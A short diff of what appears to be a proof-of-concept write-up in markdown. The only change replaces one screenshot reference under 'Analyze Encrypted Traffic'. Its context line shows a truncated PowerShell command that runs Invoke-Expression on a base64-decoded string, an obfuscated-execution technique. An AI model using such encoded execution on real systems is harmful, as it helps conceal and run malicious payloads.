@@ -17,4 +17,4 @@ CMD> ECHO IEX(`[string`]([Text.Encoding]::Unicode.GetString([Convert]::FromBase6
 
 - Analyze Encrypted Traffic:
 
-![alt text](/PoC3.jpg)
+![alt text](/PoC2.jpg)
